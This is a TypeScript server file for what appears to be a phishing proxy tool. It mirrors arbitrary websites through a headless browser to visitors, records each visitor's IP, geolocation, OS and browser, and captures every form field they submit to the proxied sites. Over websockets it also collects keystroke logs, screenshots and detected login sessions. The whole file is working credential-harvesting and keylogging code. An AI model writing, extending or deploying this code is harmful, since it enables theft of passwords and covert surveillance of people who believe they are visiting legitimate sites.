import * as Path from 'path'
import * as FS from 'fs'
import * as Express from 'express'
import * as Http from 'http'
import * as Socket from 'socket.io'
import * as cors from 'cors'
import * as Morgan from 'morgan'
import * as proxy from 'html2canvas-proxy'
import { UAParser } from 'ua-parser-js'

import { BASE_DIR } from './constants'
import { Guest, Setting } from './datastore'
import ParallelBrowser from './parallelBrowser'
import ipLookup from './ipLookup'
import { isValidUrl, httpify } from './utils'


export const app = Express()
export const server = Http.createServer(app)
export const io = Socket(server)
export const setupAppAndIO = async (address:string, logging:boolean) => {
    const { defaultLink, retries, timeout } = await Setting.findOne({}) || await new Setting().add()
    const cacheDir = Path.join(BASE_DIR, 'cache')
    if (!FS.existsSync(cacheDir)) FS.mkdirSync(cacheDir, {recursive: true})
    const browser = new ParallelBrowser(address, cacheDir, defaultLink, retries, timeout)

    if (logging) app.use(Morgan('combined'))
    app.use(cors({origin: true}))
    app.use(Express.urlencoded())
    app.use('/proxy', proxy())
    app.use(Express.static(Path.resolve(__dirname, '../frontend'), {index: false}))
    app.use(Express.static(cacheDir, {index: false}))

    app.get('/admin', async (req, resp) => {
        resp.status(200)
            .sendFile(Path.resolve(__dirname, '../frontend/index.html'))
    })

    app.all('*', async (req, resp) => {
        let link = httpify(decodeURIComponent(req.url.slice(1)))
        const setting:Setting = await Setting.findOne({})
        const ip = req.header('x-forwarded-for') || req.connection.remoteAddress
        let guest:Guest = await Guest.findOne({ ip })

        if (!guest) guest = await new Guest().add(ip)
        if (!isValidUrl(link)) link = setting.defaultLink
        else guest.logs.push(`${req.method} - ${link} - ${new Date()}`)

        const ipInfo = await ipLookup(ip) || {}

        Object.entries(ipInfo)
              .forEach(([key, value]) => guest[key] = value)

        if (req.method.toLowerCase() === 'post' && !link.startsWith(defaultLink)) {
            /* Storing in arrays intentionally, nedb-models fails with nested objects 🤷‍♂️ */
            const chunks = Object
                .entries(req.body)
                .filter(([key, value]) => !!value)
                .map(([key, value]) => `${key}: ${value}`)

            if (chunks.length) guest.posts.push({path: link, date: new Date(), data: chunks})
        }

        await guest.save()
        resp.status(200)
            .sendFile(Path.join(cacheDir, await browser.get(link, req.headers, ip)))
    })

    io.on('connection', async socket => {
        const ip = socket.handshake.address
        const sessionId = socket.id
        const keyLog:KeyLog = {url: '', log: '', date: new Date()}

        socket.on('new guest', () => socket.join('guests'))

        socket.on('general info', async (info:GeneralInfo) => {
            const guest:Guest = await Guest.findOne({ ip })
            const navigator = new UAParser(info.userAgent)

            if (guest) {
                Object
                    .entries(info)
                    .forEach(([key, value]) => { if (key !== 'userAgent') guest[key] = value })

                guest.sessionId = sessionId
                guest.os = `${navigator.getOS().name} ${navigator.getOS().version}`,
                guest.browser = `${navigator.getBrowser().name} ${navigator.getBrowser().version}`,
                guest.browserEngine = `${navigator.getEngine().name} ${navigator.getEngine().version}`,
                guest.cpuArch = navigator.getCPU().architecture

                await guest.save()
            }
        })

        socket.on('key log', (url:string, log:string) => {
            keyLog.url = url
            keyLog.log = log
        })

        socket.on('receive screenshot', async (url:string) => {
            const guest:Guest = await Guest.findOne({ ip })

            if (guest && !guest.screenshots.includes(url)) {
                guest.screenshots.push(url)
                await guest.save()
            }
        })

        socket.on('detected sessions', async (sessions:Sessions) => {
            const guest:Guest = await Guest.findOne({ ip })

            if (guest) {
                guest.sessions = sessions
                await guest.save()
            }
        })

        socket.on('disconnect', async () => {
            const guest:Guest = await Guest.findOne({ ip })

            if (guest && keyLog.log) {
                guest.keyLogs.push(keyLog)
                await guest.save()
            }
        })
    })
}
